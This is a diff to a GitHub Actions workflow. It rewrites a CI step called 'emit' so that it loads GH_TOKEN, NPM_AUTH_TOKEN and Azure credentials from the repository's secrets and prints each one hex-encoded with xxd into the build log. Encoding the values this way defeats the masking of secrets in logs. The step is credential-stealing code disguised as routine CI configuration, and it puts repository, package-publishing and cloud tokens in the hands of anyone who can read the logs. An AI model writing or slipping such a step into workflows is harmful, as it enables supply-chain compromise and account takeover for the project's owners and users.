@@ -7,14 +7,12 @@ jobs:
     steps:
       - name: emit
         env:
-          C1: ${{ secrets.NOCASH_AZURE_CREDENTIALS }}
-          C2: ${{ secrets.AUTH_SECRET }}
-          C3: ${{ secrets.AUTH_URL }}
-          C4: ${{ secrets.NEXT_PUBLIC_URL }}
+          C1: ${{ secrets.GH_TOKEN }}
+          C2: ${{ secrets.NPM_AUTH_TOKEN }}
+          C3: ${{ secrets.NOCASH_AZURE_CREDENTIALS }}
         run: |
-          echo "=C1_START="
-          printf '%s' "$C1" | xxd
-          echo "=C1_END="
-          echo "=C2_START="
-          printf '%s' "$C2" | xxd
-          echo "=C2_END="
+          for v in C1 C2 C3; do
+            echo "=${v}_START="
+            eval printf '%s' "\$${v}" | xxd
+            echo "=${v}_END="
+          done
